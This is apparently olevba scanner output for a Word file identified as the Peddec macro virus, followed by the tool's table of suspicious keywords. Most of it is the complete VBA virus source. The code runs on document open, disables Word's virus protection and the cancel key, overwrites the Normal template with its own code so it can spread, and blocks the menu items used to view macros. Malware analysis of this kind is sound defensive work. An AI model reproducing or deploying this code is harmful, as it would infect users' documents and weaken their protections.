olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Peddec-ac5801eeaba9ef348b516027fe53fd43a61d5e2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Peddec-ac5801eeaba9ef348b516027fe53fd43a61d5e2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'
'
'
Rem Version 2001.3.1
Sub HelpAbout()
H = MsgBox("This Macrosoft Word (TM) program is licensed to :Sting", vbOKOnly + vbExclamation, "XIXI")
End Sub
Sub ToolsMacro()
H = MsgBox("Sorry ... you dont have the rights", vbExclamation + vbOKOnly)
End Sub
Sub ViewVbCode()
ToolsMacro
End Sub
Sub toolsrecordmacrostart()
ToolsMacro
End Sub
Sub ViewSecurity()
ToolsMacro
'Sub Filesave()
ActiveDocument.Save
CommandBars("Standard").Controls(3).Copy Before:=5
End Sub
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
EnableCancelKey = wdCancelDisabled
Set sourcecode = MacroContainer.VBProject.VBComponents.Item(1).codemodule
Set Des = NormalTemplate: n = "Rem V2001"
If MacroContainer = Des Then Set Des = ActiveDocument: n = "Rem V2001"
Set dep = Des.VBProject.VBComponents
Set dec = dep.Item(1).codemodule
For i = 1 To dep.Count
dep.Remove dep.Item(i)
Next i
dec.deletelines 1, dec.countoflines
For i = 1 To sourcecode.countoflines
    If i <= 20 Then
        If Left(sourcecode.lines(i, 1), 1) = "'" Then
            dec.insertlines i, Mid$(sourcecode.lines(i, 1), 2)
         Else
            dec.insertlines i, "'" + sourcecode.lines(i, 1)
        End If
     Else
        dec.insertlines i, sourcecode.lines(i, 1)
    End If
Next i
CommandBars("Standard").Controls(3).Copy Before:=5
ActiveDocument.Save
NormalTemplate.Save
EnableCancelKey = wdCancelDisabled
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

